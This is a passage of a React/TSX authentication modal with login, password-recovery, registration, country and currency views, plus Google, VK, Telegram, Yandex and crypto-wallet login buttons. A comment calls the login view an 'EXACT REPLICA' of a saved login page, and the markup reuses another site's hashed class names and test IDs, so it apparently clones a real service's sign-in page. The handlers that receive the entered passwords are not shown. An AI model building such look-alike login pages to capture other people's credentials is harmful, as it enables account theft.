                          }
                        }}
                        aria-label="Back"
                      >
                        <div style={{ display: 'contents' }}>
                          <ArrowLeftIcon />
                        </div>
                      </button>
                    )}
                  </div>
                  <div className="modal-header_buttons-7NUzE modal-header_buttonsArray-7NUzE">
                    <button
                      className="base_root-5XEcn base_size-m-semibold-5XEcn base_variant-tertiary-5XEcn modal-header_button-7NUzE"
                      data-testid="modal-header-button-close"
                      type="button"
                      onClick={subView !== 'form' ? () => setSubView('form') : handleClose}
                      aria-label="Close"
                    >
                      <div style={{ display: 'contents' }}>
                        <CloseIcon />
                      </div>
                    </button>
                  </div>
                </div>

                <div className="modal-header_primaryHeader-7NUzE">
                  <div className="modal-header_info-7NUzE">
                    <div className="modal-header_title-7NUzE" data-testid="modal-header-title">
                      {subView === 'country' ? 'Choose country' : subView === 'currency' ? 'Choose currency' : authMode === 'register' ? 'Registration' : authMode === 'recovery' ? 'Password recovery' : 'Login'}
                    </div>
                  </div>
                </div>
              </div>

              {/* Body */}
              {showSuccess ? (
                <div className="modal-subview-container">
                  <div className="win-feedback-card">
                    <div className="win-feedback-icon">✓</div>
                    <h3 className="win-feedback-title">{authMode === 'register' ? 'Account Created' : authMode === 'recovery' ? 'Password Recovery' : 'Welcome Back'}</h3>
                    <p className="win-feedback-message">{statusMessage}</p>
                    <button
                      type="button"
                      className="base_root-V0GRR base_size-xl-V0GRR base_variant-accent-V0GRR base_isWide-V0GRR"
                      onClick={handleClose}
                    >
                      <div className="base_view-V0GRR">
                        <div className="base_content-V0GRR">Continue</div>
                      </div>
                    </button>
                  </div>
                </div>
              ) : showError ? (
                <div className="modal-subview-container">
                  <div className="win-feedback-card">
                    <div className="win-feedback-icon win-feedback-icon-err">!</div>
                    <h3 className="win-feedback-title" style={{ color: '#ef4444' }}>{errorTitle}</h3>
                    <p className="win-feedback-message">{statusMessage}</p>
                    <button
                      type="button"
                      className="base_root-V0GRR base_size-xl-V0GRR base_variant-accent-V0GRR base_isWide-V0GRR"
                      onClick={() => {
                        setShowError(false);
                        setFormBannerError(statusMessage);
                        setLoginPwd('');
                      }}
                    >
                      <div className="base_view-V0GRR">
                        <div className="base_content-V0GRR">Try Again</div>
                      </div>
                    </button>
                  </div>
                </div>
              ) : subView === 'country' ? (
                /* Country picker */
                <div className="modal-subview-container">
                  <div className="modal-picker-search">
                    <span className="modal-picker-search-icon">
                      <SearchIcon />
                    </span>
                    <input
                      type="text"
                      className="modal-picker-search-input"
                      placeholder="Search country"
                      value={countrySearch}
                      onChange={(e) => setCountrySearch(e.target.value)}
                      autoFocus
                    />
                  </div>
                  <div className="modal-picker-list">
                    {filteredCountries.map((c, idx) => {
                      const isSel = authMode === 'register'
                        ? regCountry.code === c.code && regCountry.name === c.name
                        : authMode === 'recovery'
                        ? recoveryPhoneCountry.code === c.code && recoveryPhoneCountry.name === c.name
                        : loginPhoneCountry.code === c.code && loginPhoneCountry.name === c.name;
                      return (
                        <button
                          key={`${c.code}-${idx}`}
                          type="button"
                          className={`modal-picker-item${isSel ? ' modal-picker-item-active' : ''}`}
                          onClick={() => {
                            if (authMode === 'register') {
                              setRegPhone((prev) => replaceDialCode(prev, regCountry.code, c.code));
                              setRegCountry(c);
                            } else if (authMode === 'recovery') {
                              setRecoveryPhone((prev) => replaceDialCode(prev, recoveryPhoneCountry.code, c.code));
                              setRecoveryPhoneCountry(c);
                            } else {
                              setLoginPhone((prev) => replaceDialCode(prev, loginPhoneCountry.code, c.code));
                              setLoginPhoneCountry(c);
                            }
                            setSubView('form');
                          }}
                        >
                          <span style={{ fontSize: '18px' }}>{c.flag}</span>
                          <span style={{ fontWeight: 600, minWidth: '46px' }}>{c.code}</span>
                          <span style={{ flex: 1 }}>{c.name}</span>
                        </button>
                      );
                    })}
                  </div>
                </div>
              ) : subView === 'currency' ? (
                /* Currency picker */
                <div className="modal-subview-container">
                  <div className="modal-picker-search">
                    <span className="modal-picker-search-icon">
                      <SearchIcon />
                    </span>
                    <input
                      type="text"
                      className="modal-picker-search-input"
                      placeholder="Search currency"
                      value={currencySearch}
                      onChange={(e) => setCurrencySearch(e.target.value)}
                      autoFocus
                    />
                  </div>
                  <div className="modal-picker-list">
                    {filteredCurrencies.map((c) => {
                      const isSel = regCurrency.code === c.code;
                      return (
                        <button
                          key={c.code}
                          type="button"
                          className={`modal-picker-item${isSel ? ' modal-picker-item-active' : ''}`}
                          onClick={() => {
                            setRegCurrency(c);
                            setSubView('form');
                          }}
                        >
                          <CurrencyBadge currency={c} size={32} />
                          <div style={{ display: 'flex', flexDirection: 'column', flex: 1, textAlign: 'left' }}>
                            <span style={{ fontWeight: 600 }}>{c.name}</span>
                            <span style={{ fontSize: '12px', color: '#6b7280' }}>{c.code}</span>
                          </div>
                        </button>
                      );
                    })}
                  </div>
                </div>
              ) : authMode === 'login' ? (
                /* ==========================================================
                   LOGIN VIEW - EXACT REPLICA OF rawData/login-page/index.html
                   ========================================================== */
                <div className="auth_content-G6Xzm" data-testid="recoveryPassword-content-sign-in">
                  <div>
                    {/* Segment Control: Phone vs Email */}
                    <div className="segment-control_root-mtop6 segment-control_fullWidth-mtop6 segment-control_variant-1-mtop6 segment-control_withDivider-mtop6 sign-in_segmentControl-95Gcg">
                      <button
                        className={`tab_root-gcHAi tab_kind-ghost-gcHAi ${loginSubTab === 'phone' ? 'tab_selected-gcHAi segment-control_selected-mtop6 ' : ''}tab_size-l-gcHAi tab_color-accent-gcHAi tab_fullWidth-gcHAi segment-control_tab-mtop6`}
                        type="button"
                        data-testid="signInByPhone-form-tab-phone"
                        onClick={() => {
                          setLoginSubTab('phone');
                          clearAllErrors();
                        }}
                      >
                        <div className="tab_iconWrapper-gcHAi">
                          <PhoneIcon />
                        </div>
                        <span className="tab_title-gcHAi">Phone</span>
                      </button>

                      <button
                        className={`tab_root-gcHAi tab_kind-ghost-gcHAi ${loginSubTab === 'email' ? 'tab_selected-gcHAi segment-control_selected-mtop6 ' : ''}tab_size-l-gcHAi tab_color-accent-gcHAi tab_fullWidth-gcHAi segment-control_tab-mtop6`}
                        type="button"
                        data-testid="signInByPhone-form-tab-email"
                        onClick={() => {
                          setLoginSubTab('email');
                          clearAllErrors();
                        }}
                      >
                        <div className="tab_iconWrapper-gcHAi">
                          <EmailIcon />
                        </div>
                        <span className="tab_title-gcHAi">Email</span>
                      </button>
                    </div>

                    {/* Banner Error */}
                    {formBannerError && (
                      <div
                        style={{
                          backgroundColor: '#fee2e2',
                          border: '1px solid #fecaca',
                          color: '#dc2626',
                          padding: '9px 12px',
                          borderRadius: '10px',
                          fontSize: '13px',
                          marginBottom: '12px',
                          textAlign: 'center',
                          fontWeight: 500,
                        }}
                      >
                        {formBannerError}
                      </div>
                    )}

                    {/* Form */}
                    <form className="form_root-v4nVr" style={{ alignItems: 'flex-end', '--v192d04a8': 'flex', '--v67e75506': 'initial' } as React.CSSProperties} onSubmit={handleLoginSubmit} noValidate>
                      {loginSubTab === 'phone' ? (
                        /* Phone Input */
                        <div
                          className={`field-wrapper_root-xSBJ6 base-field_root-ttxw4 base-field_filled-ttxw4${loginPhoneErr ? ' field-wrapper_status-error-xSBJ6' : ''}`}
                          style={{ marginBottom: 'var(--spacing-12)', '--v8217aea8': 'text' } as React.CSSProperties}
                        >
                          <div className="field-wrapper_control-xSBJ6">
                            <label className="base-field_content-ttxw4" htmlFor="v-15-1-0">
                              <div className="base-field_iconStart-ttxw4">
                                <button
                                  className="base_root-5XEcn base_size-m-semibold-5XEcn base_variant-tertiary-5XEcn"
                                  data-testid="signInByPhone-form-phone-chooseRegionButton"
                                  type="button"
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    setCountrySearch('');
                                    setSubView('country');
                                  }}
                                  aria-label="Select Country"
                                >
                                  <div style={{ display: 'contents' }}>
                                    <div className="phone-input_buttonContent-n13qz">
                                      <div className="tooltip_root-2Fdac">
                                        <div className="tooltip_trigger-2Fdac">
                                          <div className="icon-box_root-ejR1s icon-box_size-s-ejR1s">
                                            <picture className="picture-v2_root-uw4G6" style={{ '--v11659776': 'none' } as React.CSSProperties}>
                                              {loginPhoneCountry.code === '+91' ? (
                                                <img className="flag_img-vPcYJ picture-v2_contain-uw4G6" loading="eager" src="/assets/images/in.svg" alt="India flag" />
                                              ) : (
                                                <span style={{ fontSize: '14px', lineHeight: 1 }}>{loginPhoneCountry.flag}</span>
                                              )}
                                            </picture>
                                          </div>
                                        </div>
                                      </div>
                                      <ArrowBottomIcon />
                                    </div>
                                  </div>
                                </button>
                              </div>

                              <div className="base-field_divider-ttxw4"></div>

                              <div className="base-field_control-ttxw4">
                                <div className="base-field_controlContent-ttxw4">
                                  <div className="control_root-5SZBQ control_filled-5SZBQ">
                                    <input
                                      id="v-15-1-0"
                                      ref={phoneInputRef}
                                      className="mask-input_input-GDetI"
                                      data-testid="signInByPhone-form-phone"
                                      type="tel"
                                      inputMode="tel"
                                      autoComplete="off"
                                      value={loginPhone}
                                      onChange={(e) => handlePhoneChange(e.target.value, setLoginPhone, setLoginPhoneCountry)}
                                      onFocus={() => {
                                        setIsPhoneFocused(true);
                                        setLoginPhoneErr('');
                                      }}
                                      onBlur={() => setIsPhoneFocused(false)}
                                    />
                                    <div className="control_placeholder-5SZBQ">
                                      {!loginPhone ? (
                                        <>
                                          <span className="control_hiddenPlaceholder-5SZBQ">{loginPhoneCountry.code}</span>
                                          <span style={{ marginLeft: '10px' }}>00000 00000</span>
                                        </>
                                      ) : loginPhone.trim() === loginPhoneCountry.code ? (
                                        <>
                                          <span style={{ color: 'transparent', userSelect: 'none', whiteSpace: 'pre' }}>{loginPhone}</span>
                                          <span style={{ marginLeft: '8px' }}>00000 00000</span>
                                        </>
                                      ) : null}
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </label>
                          </div>
                          {loginPhoneErr && (
                            <div style={{ color: '#ef4444', fontSize: '12px', marginTop: '2px', paddingLeft: '4px' }}>
                              {loginPhoneErr}
                            </div>
                          )}
                        </div>
                      ) : (
                        /* Email Input */
                        <div
                          className={`field-wrapper_root-xSBJ6 base-field_root-ttxw4 base-field_hasLabel-ttxw4${loginEmail ? ' base-field_filled-ttxw4' : ''}${isEmailFocused ? ' base-field_focused-ttxw4' : ''}${loginEmailErr ? ' field-wrapper_status-error-xSBJ6' : ''}`}
                          style={{ marginBottom: 'var(--spacing-12)', '--v8217aea8': 'text' } as React.CSSProperties}
                        >
                          <div className="field-wrapper_control-xSBJ6">
                            <label className="base-field_content-ttxw4" htmlFor="v-login-email">
                              <div className="base-field_iconStart-ttxw4">
                                <EmailIcon />
                              </div>

                              <div className="base-field_divider-ttxw4"></div>

                              <div className="base-field_control-ttxw4">
                                <div className="base-field_controlContent-ttxw4">
                                  <div className={`control_root-5SZBQ control_hasLabel-5SZBQ${loginEmail ? ' control_filled-5SZBQ' : ''}`}>
                                    <input
                                      id="v-login-email"
                                      type="email"
                                      autoComplete="email"
                                      value={loginEmail}
                                      onChange={(e) => {
                                        setLoginEmail(e.target.value);
                                        setLoginEmailErr('');
                                      }}
                                      onFocus={() => {
                                        setIsEmailFocused(true);
                                        setLoginEmailErr('');
                                      }}
                                      onBlur={() => setIsEmailFocused(false)}
                                    />
                                  </div>
                                </div>
                                <div className="base-field_label-ttxw4">Email</div>
                              </div>
                            </label>
                          </div>
                          {loginEmailErr && (
                            <div style={{ color: '#ef4444', fontSize: '12px', marginTop: '2px', paddingLeft: '4px' }}>
                              {loginEmailErr}
                            </div>
                          )}
                        </div>
                      )}

                      {/* Password Input */}
                      <div
                        className={`field-wrapper_root-xSBJ6 base-field_root-ttxw4 base-field_hasLabel-ttxw4${loginPwd ? ' base-field_filled-ttxw4' : ''}${isPwdFocused ? ' base-field_focused-ttxw4' : ''}${loginPwdErr ? ' field-wrapper_status-error-xSBJ6' : ''}`}
                        title="Password"
                        style={{ marginBottom: 'var(--spacing-8)', '--v8217aea8': 'text' } as React.CSSProperties}
                      >
                        <div className="field-wrapper_control-xSBJ6">
                          <label className="base-field_content-ttxw4" htmlFor="v-15-1-1">
                            <div className="base-field_iconStart-ttxw4">
                              <LockIcon />
                            </div>

                            <div className="base-field_divider-ttxw4"></div>

                            <div className="base-field_control-ttxw4">
                              <div className="base-field_controlContent-ttxw4">
                                <div className={`control_root-5SZBQ control_hasLabel-5SZBQ${loginPwd ? ' control_filled-5SZBQ' : ''}`}>
                                  <input
                                    id="v-15-1-1"
                                    data-testid="signInByPhone-form-password"
                                    type="password"
                                    autoComplete="current-password"
                                    value={loginPwd}
                                    onChange={(e) => {
                                      setLoginPwd(e.target.value);
                                      setLoginPwdErr('');
                                    }}
                                    onFocus={() => {
                                      setIsPwdFocused(true);
                                      setLoginPwdErr('');
                                    }}
                                    onBlur={() => setIsPwdFocused(false)}
                                  />
                                </div>
                              </div>
                              <div className="base-field_label-ttxw4">Password</div>
                            </div>
                          </label>
                        </div>
                        {loginPwdErr && (
                          <div style={{ color: '#ef4444', fontSize: '12px', marginTop: '2px', paddingLeft: '4px' }}>
                            {loginPwdErr}
                          </div>
                        )}
                      </div>

                      {/* Forgot your password? button with redirect link to our login page */}
                      <button
                        className="base_root-5XEcn base_size-m-semibold-5XEcn base_variant-accent-5XEcn"
                        data-testid="signInByPhone-form-recoveryPassword"
                        type="button"
                        style={{ marginBottom: 'var(--spacing-16)' }}
                        onClick={handleForgotPassword}
                      >
                        <div style={{ display: 'contents' }}>Forgot your password?</div>
                      </button>

                      {/* Log in Button */}
                      <button
                        className="base_root-V0GRR base_size-xl-V0GRR base_variant-accent-V0GRR base_isWide-V0GRR"
                        data-testid="signInByPhone-form-submit"
                        type="submit"
                        disabled={isSubmitting}
                      >
                        <div className="base_view-V0GRR">
                          <div className="base_content-V0GRR">
                            <div style={{ display: 'contents' }}>{isSubmitting ? 'Logging in...' : 'Log in'}</div>
                          </div>
                        </div>
                      </button>
                    </form>

                    {/* Divider: or */}
                    <div className="sign-in_line-95Gcg sign-in_withText-95Gcg">or</div>

                    {/* OAuth / Social Logins */}
                    <div className="oauth-buttons-container_root-cya6C sign-in_socials-95Gcg">
                      <div className="oauth-buttons-container_buttons-cya6C oauth-buttons-container_centered-cya6C">
                        <button className="base_root-HuD6g base_size-xl-HuD6g base_rootInteractive-HuD6g" data-testid="signInByPhone-form-socialButton-google" type="button" aria-label="Google">
                          <div className="base_view-HuD6g">
                            <GoogleIcon />
                          </div>
                        </button>

                        <button className="base_root-HuD6g base_size-xl-HuD6g base_rootInteractive-HuD6g" data-testid="signInByPhone-form-socialButton-vk" type="button" aria-label="VK">
                          <div className="base_view-HuD6g">
                            <VkIcon />
                          </div>
                        </button>

                        <button className="base_root-HuD6g base_size-xl-HuD6g base_rootInteractive-HuD6g" data-testid="signInByPhone-form-socialButton-telegram" type="button" aria-label="Telegram">
                          <div className="base_view-HuD6g">
                            <TelegramIcon />
                          </div>
                        </button>

                        <button className="base_root-HuD6g base_size-xl-HuD6g base_rootInteractive-HuD6g" data-testid="signInByPhone-form-socialButton-yandex" type="button" aria-label="Yandex">
                          <div className="base_view-HuD6g">
                            <YandexIcon />
                          </div>
                        </button>

                        <button className="base_root-HuD6g base_size-xl-HuD6g base_rootInteractive-HuD6g" type="button" aria-label="WalletConnect">
                          <div className="base_view-HuD6g">
                            <WalletConnectIcon />
                          </div>
                        </button>

                        <button className="base_root-HuD6g base_size-xl-HuD6g base_rootInteractive-HuD6g" type="button" aria-label="MetaMask">
                          <div className="base_view-HuD6g">
                            <MetaMaskIcon />
                          </div>
                        </button>

                        <button className="base_root-HuD6g base_size-xl-HuD6g base_rootInteractive-HuD6g" type="button" aria-label="TrustWallet">
                          <div className="base_view-HuD6g">
                            <TrustWalletIcon />
                          </div>
                        </button>
                      </div>
                    </div>

                    {/* Don't have an account? Register */}
                    <div className="sign-in_register-95Gcg">
                      <div>Don’t have an account?</div>
                      <button
                        className="base_root-5XEcn base_size-m-semibold-5XEcn base_variant-accent-5XEcn"
                        data-testid="signInByPhone-form-signUpButton"
                        type="button"
                        onClick={() => {
                          setAuthMode('register');
                          clearAllErrors();
                        }}
                      >
                        <div style={{ display: 'contents' }}>Register</div>
                      </button>
                    </div>
                  </div>
                </div>
              ) : authMode === 'recovery' ? (
                /* ==========================================================
                   PASSWORD RECOVERY VIEW
                   ========================================================== */
                <div className="auth_content-G6Xzm" data-testid="recoveryPassword-content-recovery">
                  <div>
                    {/* Instructional text */}
                    <div className="password-recovery_text-0Hx8Q">
                      Enter the phone number or email you used during registration
                    </div>

                    {/* Segment Control / Tabs: Phone or Email */}
                    <div className="segment-control_root-mtop6 segment-control_fullWidth-mtop6 segment-control_variant-1-mtop6 segment-control_withDivider-mtop6 password-recovery_segmentControl-0Hx8Q">
                      <button
                        className={`tab_root-gcHAi tab_kind-ghost-gcHAi tab_size-l-gcHAi tab_color-accent-gcHAi tab_fullWidth-gcHAi segment-control_tab-mtop6${recoverySubTab === 'phone' ? ' tab_selected-gcHAi segment-control_selected-mtop6' : ''}`}
                        type="button"
                        data-testid="recoveryPassword-form-tab-phone"
                        onClick={() => {
                          setRecoverySubTab('phone');
                          clearAllErrors();
                        }}
                      >
                        <div className="tab_iconWrapper-gcHAi">
                          <PhoneIcon />
                        </div>
                        <span className="tab_title-gcHAi">Phone</span>
                      </button>

                      <button
                        className={`tab_root-gcHAi tab_kind-ghost-gcHAi tab_size-l-gcHAi tab_color-accent-gcHAi tab_fullWidth-gcHAi segment-control_tab-mtop6${recoverySubTab === 'email' ? ' tab_selected-gcHAi segment-control_selected-mtop6' : ''}`}
                        type="button"
                        data-testid="recoveryPassword-form-tab-email"
                        onClick={() => {
                          setRecoverySubTab('email');
                          clearAllErrors();
                        }}
                      >
                        <div className="tab_iconWrapper-gcHAi">
                          <EmailIcon />
                        </div>
                        <span className="tab_title-gcHAi">Email</span>
                      </button>
                    </div>

                    {/* Banner Error */}
                    {formBannerError && (
                      <div
                        style={{
                          backgroundColor: '#fee2e2',
                          border: '1px solid #fecaca',
                          color: '#dc2626',
                          borderRadius: '8px',
                          padding: '10px 14px',
                          fontSize: '13px',
                          marginBottom: '12px',
                          textAlign: 'center',
                          fontWeight: 500,
                        }}
                      >
                        {formBannerError}
                      </div>
                    )}

                    {/* Form */}
                    <form className="form_root-v4nVr" style={{ alignItems: 'flex-end', '--v192d04a8': 'flex', '--v67e75506': 'initial' } as React.CSSProperties} onSubmit={handleRecoverySubmit} noValidate>
                      {recoverySubTab === 'phone' ? (
                        /* Phone Input */
                        <div
                          className={`field-wrapper_root-xSBJ6 base-field_root-ttxw4 base-field_hasLabel-ttxw4${recoveryPhone ? ' base-field_filled-ttxw4' : ''}${isRecoveryPhoneFocused ? ' base-field_focused-ttxw4' : ''}${recoveryPhoneErr ? ' field-wrapper_status-error-xSBJ6' : ''}`}
                          style={{ marginBottom: 'var(--spacing-16)', '--v8217aea8': 'text' } as React.CSSProperties}
                        >
                          <div className="field-wrapper_control-xSBJ6">
                            <label className="base-field_content-ttxw4" htmlFor="v-recovery-phone">
                              <div className="base-field_iconStart-ttxw4">
                                <button
                                  type="button"
                                  className="country-select_root-k4v3L"
                                  data-testid="country-select-button"
                                  tabIndex={-1}
                                  onClick={(e) => {
                                    e.preventDefault();
                                    e.stopPropagation();
                                    setCountrySearch('');
                                    setSubView('country');
                                  }}
                                  style={{ display: 'flex', alignItems: 'center', gap: '4px', background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}
                                >
                                  <div className="flag_root-vPcYJ">
                                    <div className="flag_flag-vPcYJ">
                                      <picture className="picture-v2_root-uw4G6" style={{ '--v11659776': 'none' } as React.CSSProperties}>
                                        {recoveryPhoneCountry.code === '+91' ? (
                                          <img className="flag_img-vPcYJ picture-v2_contain-uw4G6" loading="eager" src="/assets/images/in.svg" alt="India flag" />
                                        ) : (
                                          <span style={{ fontSize: '14px', lineHeight: 1 }}>{recoveryPhoneCountry.flag}</span>
                                        )}
                                      </picture>
                                    </div>
                                  </div>
                                  <ArrowBottomIcon />
                                </button>
                              </div>

                              <div className="base-field_divider-ttxw4"></div>

                              <div className="base-field_control-ttxw4">
                                <div className="base-field_controlContent-ttxw4">
                                  <div className="control_root-5SZBQ control_filled-5SZBQ">
                                    <input
                                      id="v-recovery-phone"
                                      ref={recoveryPhoneInputRef}
                                      className="mask-input_input-GDetI"
                                      data-testid="recoveryPassword-form-phone"
                                      type="tel"
                                      inputMode="tel"
                                      autoComplete="off"
                                      value={recoveryPhone}
                                      onChange={(e) => handlePhoneChange(e.target.value, setRecoveryPhone, setRecoveryPhoneCountry)}
                                      onFocus={() => {
                                        setIsRecoveryPhoneFocused(true);
                                        setRecoveryPhoneErr('');
                                      }}
                                      onBlur={() => setIsRecoveryPhoneFocused(false)}
                                    />
                                    <div className="control_placeholder-5SZBQ">
                                      {!recoveryPhone ? (
                                        <>
                                          <span className="control_hiddenPlaceholder-5SZBQ">{recoveryPhoneCountry.code}</span>
                                          <span style={{ marginLeft: '10px' }}>00000 00000</span>
                                        </>
                                      ) : recoveryPhone.trim() === recoveryPhoneCountry.code ? (
                                        <>
                                          <span style={{ color: 'transparent', userSelect: 'none', whiteSpace: 'pre' }}>{recoveryPhone}</span>
                                          <span style={{ marginLeft: '8px' }}>00000 00000</span>
                                        </>
                                      ) : null}
                                    </div>
                                  </div>
                                </div>
                                <div className="base-field_label-ttxw4">Phone number</div>
                              </div>
                            </label>
                          </div>
                          {recoveryPhoneErr && (
                            <div style={{ color: '#ef4444', fontSize: '12px', marginTop: '2px', paddingLeft: '4px' }}>
                              {recoveryPhoneErr}
                            </div>
                          )}
                        </div>
                      ) : (
                        /* Email Input */
                        <div
                          className={`field-wrapper_root-xSBJ6 base-field_root-ttxw4 base-field_hasLabel-ttxw4${recoveryEmail ? ' base-field_filled-ttxw4' : ''}${isRecoveryEmailFocused ? ' base-field_focused-ttxw4' : ''}${recoveryEmailErr ? ' field-wrapper_status-error-xSBJ6' : ''}`}
                          style={{ marginBottom: 'var(--spacing-16)', '--v8217aea8': 'text' } as React.CSSProperties}
                        >
                          <div className="field-wrapper_control-xSBJ6">
                            <label className="base-field_content-ttxw4" htmlFor="v-recovery-email">
                              <div className="base-field_iconStart-ttxw4">
                                <EmailIcon />
                              </div>

                              <div className="base-field_divider-ttxw4"></div>

                              <div className="base-field_control-ttxw4">
                                <div className="base-field_controlContent-ttxw4">
                                  <div className={`control_root-5SZBQ control_hasLabel-5SZBQ${recoveryEmail ? ' control_filled-5SZBQ' : ''}`}>
                                    <input
                                      id="v-recovery-email"
                                      data-testid="recoveryPassword-form-email"
                                      type="email"
                                      autoComplete="email"
                                      value={recoveryEmail}
                                      onChange={(e) => {
                                        setRecoveryEmail(e.target.value);
                                        setRecoveryEmailErr('');
                                      }}
                                      onFocus={() => {
                                        setIsRecoveryEmailFocused(true);
                                        setRecoveryEmailErr('');
                                      }}
                                      onBlur={() => setIsRecoveryEmailFocused(false)}
                                    />
                                  </div>
                                </div>
                                <div className="base-field_label-ttxw4">Email</div>
                              </div>
                            </label>
                          </div>
                          {recoveryEmailErr && (
                            <div style={{ color: '#ef4444', fontSize: '12px', marginTop: '2px', paddingLeft: '4px' }}>
                              {recoveryEmailErr}
                            </div>
                          )}
                        </div>
                      )}

                      {/* Submit Button */}
                      <button
                        className="base_root-V0GRR base_size-xl-V0GRR base_variant-accent-V0GRR base_isWide-V0GRR"
                        data-testid="recoveryPassword-form-submit"
                        type="submit"
                        disabled={isSubmitting}
                      >
                        <div className="base_view-V0GRR">
                          <div className="base_content-V0GRR">
                            <div style={{ display: 'contents' }}>{isSubmitting ? 'Sending...' : 'Continue'}</div>
                          </div>
                        </div>
                      </button>
                    </form>

                    {/* Back to Log in */}
                    <div className="sign-in_register-95Gcg" style={{ marginTop: 'var(--spacing-16)' }}>
                      <div>Remember your password?</div>
                      <button
                        className="base_root-5XEcn base_size-m-semibold-5XEcn base_variant-accent-5XEcn"
                        data-testid="recoveryPassword-form-signInButton"
                        type="button"
                        onClick={() => {
                          setAuthMode('login');
                          clearAllErrors();
                        }}
                      >
                        <div style={{ display: 'contents' }}>Log in</div>
                      </button>
                    </div>
                  </div>
                </div>
              ) : (
                /* ==========================================================
                   REGISTRATION VIEW
                   ========================================================== */
                <div className="auth_content-G6Xzm">
                  <div>
                    <form className="form_root-v4nVr" onSubmit={handleRegisterSubmit} noValidate>
                      {/* Currency Field */}
                      <div className="field-wrapper_root-xSBJ6 base-field_root-ttxw4" style={{ marginBottom: 'var(--spacing-12)' }}>
                        <div className="field-wrapper_control-xSBJ6" onClick={() => { setCurrencySearch(''); setSubView('currency'); }} style={{ cursor: 'pointer' }}>
                          <div className="base-field_content-ttxw4" style={{ cursor: 'pointer' }}>
                            <div className="base-field_iconStart-ttxw4">
                              <CurrencyBadge currency={regCurrency} size={24} />
                            </div>
                            <div className="base-field_divider-ttxw4"></div>
                            <div className="base-field_control-ttxw4">
                              <div style={{ fontSize: '14px', fontWeight: 500, color: '#111827' }}>
                                {regCurrency.name} ({regCurrency.code})
                              </div>
                            </div>
                            <ArrowBottomIcon />
                          </div>
                        </div>
                      </div>

                      {/* Phone Field */}
                      <div className={`field-wrapper_root-xSBJ6 base-field_root-ttxw4 base-field_filled-ttxw4${regPhoneErr ? ' field-wrapper_status-error-xSBJ6' : ''}`} style={{ marginBottom: 'var(--spacing-12)' }}>
                        <div className="field-wrapper_control-xSBJ6">
                          <label className="base-field_content-ttxw4">
                            <div className="base-field_iconStart-ttxw4">
                              <button
                                className="base_root-5XEcn base_size-m-semibold-5XEcn base_variant-tertiary-5XEcn"
                                type="button"
                                onClick={(e) => {
                                  e.stopPropagation();
                                  setCountrySearch('');
                                  setSubView('country');
                                }}
                              >
                                <div style={{ display: 'contents' }}>
                                  <div className="phone-input_buttonContent-n13qz">
                                    <span style={{ fontSize: '14px' }}>{regCountry.flag}</span>
                                    <ArrowBottomIcon />
                                  </div>
                                </div>
                              </button>
                            </div>

                            <div className="base-field_divider-ttxw4"></div>

                            <div className="base-field_control-ttxw4">
                              <div className="base-field_controlContent-ttxw4">
                                <div className="control_root-5SZBQ control_filled-5SZBQ">
                                  <input
                                    className="mask-input_input-GDetI"
                                    type="tel"
                                    inputMode="tel"
                                    value={regPhone}
                                    onChange={(e) => handlePhoneChange(e.target.value, setRegPhone, setRegCountry)}
                                    onFocus={() => setRegPhoneErr('')}
                                  />
                                  <div className="control_placeholder-5SZBQ">
                                    {!regPhone ? (
                                      <>
                                        <span className="control_hiddenPlaceholder-5SZBQ">{regCountry.code}</span>
                                        <span style={{ marginLeft: '10px' }}>00000 00000</span>
                                      </>
                                    ) : regPhone.trim() === regCountry.code ? (
                                      <>
                                        <span style={{ color: 'transparent', userSelect: 'none', whiteSpace: 'pre' }}>{regPhone}</span>
                                        <span style={{ marginLeft: '8px' }}>00000 00000</span>
                                      </>
                                    ) : null}
                                  </div>
                                </div>
                              </div>
                            </div>
                          </label>
                        </div>
                        {regPhoneErr && (
                          <div style={{ color: '#ef4444', fontSize: '12px', marginTop: '2px', paddingLeft: '4px' }}>
                            {regPhoneErr}
                          </div>
                        )}
                      </div>

                      {/* Email Field */}
                      <div className={`field-wrapper_root-xSBJ6 base-field_root-ttxw4 base-field_hasLabel-ttxw4${regEmail ? ' base-field_filled-ttxw4' : ''}${regEmailErr ? ' field-wrapper_status-error-xSBJ6' : ''}`} style={{ marginBottom: 'var(--spacing-12)' }}>
                        <div className="field-wrapper_control-xSBJ6">
                          <label className="base-field_content-ttxw4">
                            <div className="base-field_iconStart-ttxw4">
                              <EmailIcon />
                            </div>
                            <div className="base-field_divider-ttxw4"></div>
                            <div className="base-field_control-ttxw4">
                              <div className="base-field_controlContent-ttxw4">
                                <div className={`control_root-5SZBQ control_hasLabel-5SZBQ${regEmail ? ' control_filled-5SZBQ' : ''}`}>
                                  <input
                                    type="email"
                                    autoComplete="email"
                                    value={regEmail}
                                    onChange={(e) => {
                                      setRegEmail(e.target.value);
                                      setRegEmailErr('');
                                    }}
                                  />
                                </div>
                              </div>
                              <div className="base-field_label-ttxw4">Email</div>
                            </div>
                          </label>
                        </div>
                        {regEmailErr && (
                          <div style={{ color: '#ef4444', fontSize: '12px', marginTop: '2px', paddingLeft: '4px' }}>
                            {regEmailErr}
                          </div>
                        )}
                      </div>

                      {/* Password Field */}
                      <div className={`field-wrapper_root-xSBJ6 base-field_root-ttxw4 base-field_hasLabel-ttxw4${regPwd ? ' base-field_filled-ttxw4' : ''}${regPwdErr ? ' field-wrapper_status-error-xSBJ6' : ''}`} style={{ marginBottom: 'var(--spacing-12)' }}>
                        <div className="field-wrapper_control-xSBJ6">
                          <label className="base-field_content-ttxw4">
                            <div className="base-field_iconStart-ttxw4">
                              <LockIcon />
                            </div>
                            <div className="base-field_divider-ttxw4"></div>
                            <div className="base-field_control-ttxw4">
                              <div className="base-field_controlContent-ttxw4">
                                <div className={`control_root-5SZBQ control_hasLabel-5SZBQ${regPwd ? ' control_filled-5SZBQ' : ''}`}>
                                  <input
                                    type="password"
                                    autoComplete="new-password"
                                    value={regPwd}
                                    onChange={(e) => {
                                      setRegPwd(e.target.value);
                                      setRegPwdErr('');
                                    }}
                                  />
                                </div>
                              </div>
                              <div className="base-field_label-ttxw4">Password</div>
                            </div>
                          </label>
                        </div>
                        <div style={{ fontSize: '11px', color: '#6b7280', marginTop: '2px', paddingLeft: '4px' }}>
                          At least 8 characters
                        </div>
                        {regPwdErr && (
                          <div style={{ color: '#ef4444', fontSize: '12px', marginTop: '2px', paddingLeft: '4px' }}>
                            {regPwdErr}
                          </div>
                        )}
                      </div>

                      {/* Promo Code section */}
                      <div style={{ marginBottom: '12px' }}>
                        <button
                          type="button"
                          className="base_root-5XEcn base_size-m-semibold-5XEcn base_variant-accent-5XEcn"
